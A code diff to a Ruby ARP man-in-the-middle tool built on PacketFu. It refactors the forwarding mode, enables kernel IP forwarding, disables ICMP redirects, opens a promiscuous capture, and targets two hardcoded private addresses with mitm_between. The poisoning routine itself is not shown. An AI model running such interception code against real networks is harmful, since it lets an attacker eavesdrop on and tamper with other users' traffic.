@@ -54,10 +54,10 @@ class Arpon
 	def start(forward=false)
 		@forward = forward
 		case @forward
-		when "kernel"
+		when :kernel
 			`echo 1 > /proc/sys/net/ipv4/ip_forward`
 			`echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects`
-		when "userspace"
+		when :userspace
 			filter = "host not %s and ether dst %s" % [@iface[:ip_saddr], @iface[:eth_saddr]]
 			cap = PacketFu::Capture.new(:start => true, :promisc => true, :iface => @iface[:iface], :filter => filter, :timeout => 100)
 			@threads << Thread.new do
@@ -89,12 +89,11 @@ class Arpon
 	end
 
 	def stop
-		@started = false
 		@threads.each do |t|
 			Thread.kill(t)
 		end
 		case @forward
-		when "kernel"
+		when :kernel
 			`echo 0 > /proc/sys/net/ipv4/ip_forward`
 			`echo 1 > /proc/sys/net/ipv4/conf/all/send_redirects`
 		end
@@ -116,7 +115,7 @@ end
 
 a = Arpon.new('eth0')
 a.mitm_between('10.0.2.1', '10.0.2.4')
-a.start("kernel")
+a.start(:kernel)
 
 trap("INT") do 
 	a.stop
@@ -125,4 +124,5 @@ end
 
 
 loop do
+	sleep 60
 end
